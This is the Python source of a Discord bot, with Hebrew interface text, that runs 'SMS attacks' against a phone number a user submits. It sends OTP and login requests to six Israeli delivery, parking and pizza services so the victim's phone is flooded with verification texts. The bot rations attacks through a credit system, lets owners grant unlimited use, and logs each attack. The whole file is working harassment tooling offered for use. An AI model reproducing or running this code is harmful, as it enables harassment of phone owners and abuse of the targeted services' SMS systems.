import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio, datetime
from flask import Flask
from threading import Thread

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
def keep_alive():
    Thread(target=run).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "database.json"
LOG_CHANNEL_ID = 1499510962296721568

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f: return json.load(f)

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

async def send_log(bot, title, description, color=discord.Color.blue()):
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        await channel.send(embed=embed)

# --- מנוע תקיפה עם דוח ---
async def run_attack(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    success, failed = 0, 0
    targets = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        for t in targets:
            try:
                resp = await client.post(t["url"], json=t["json"], headers=headers)
                if 200 <= resp.status_code < 300: success += 1
                else: failed += 1
            except: failed += 1
    return success, failed

# --- UI: ה-Modal וה-Control Panel ---

class AttackModal(discord.ui.Modal, title="Vouge - Start Attack"):
    phone = discord.ui.TextInput(label="Phone Number", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = get_data()
        uid = str(interaction.user.id)
        is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        
        if self.phone.value in data["blacklist"]:
            return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)
        
        if not is_owner:
            user_credits = data["credits"].get(uid, 0)
            if user_credits <= 0:
                return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)
            data["credits"][uid] -= 1
            save_data(data)

        await interaction.response.send_message(f"💣 תקיפה על {self.phone.value} החלה...", ephemeral=True)
        
        success, fails = await run_attack(self.phone.value)
        
        # לוג לערוץ
        report = (
            f"**משתמש:** {interaction.user.mention}\n"
            f"**יעד:** {self.phone.value}\n"
            f"✅ הצלחות: `{success}` | ❌ כשלונות: `{fails}`"
        )
        await send_log(interaction.client, "🚀 דוח תקיפה מהפאנל", report, discord.Color.red())

class ControlPanelView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Start Attack", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="attack_btn")
    async def attack_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())

# --- Bot Setup ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        self.add_view(ControlPanelView()) # שומר על הכפתור פעיל גם אחרי ריסטארט
        await self.tree.sync()

bot = MyBot()

# --- פקודות סלאש ---

@bot.tree.command(name="setup", description="הצגת ה-Control Panel")
async def setup(interaction: discord.Interaction):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ רק Owner יכול להוציא פאנל!", ephemeral=True)
    
    embed = discord.Embed(
        title="🛡️ Vouge Control Panel",
        description="לחץ על הכפתור למטה כדי להתחיל תקיפת SMS.\nכל הפעולות מנוטרות.",
        color=discord.Color.dark_red()
    )
    await interaction.response.send_message(embed=embed, view=ControlPanelView())

@bot.tree.command(name="addcredit", description="הוספת קרדיטים למשתמש")
async def add_credit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
    data = get_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} קרדיטים ל-{member.mention}")
    await send_log(bot, "➕ עדכון קרדיטים", f"{interaction.user.mention} הוסיף קרדיטים ל-{member.mention}", discord.Color.green())

@bot.tree.command(name="checkcredit", description="בדיקת יתרת קרדיטים")
async def check_credit(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    data = get_data()
    balance = data["credits"].get(str(target.id), 0)
    await interaction.response.send_message(f"💰 יתרה של {target.display_name}: `{balance}` קרדיטים.", ephemeral=True)

@bot.tree.command(name="grant", description="גישה ללא הגבלה")
async def grant(interaction: discord.Interaction, member: discord.Member):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME): return
    data = get_data()
    data["credits"][str(member.id)] = 999999
    save_data(data)
    await interaction.response.send_message(f"👑 {member.mention} קיבל גישה חופשית!")

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
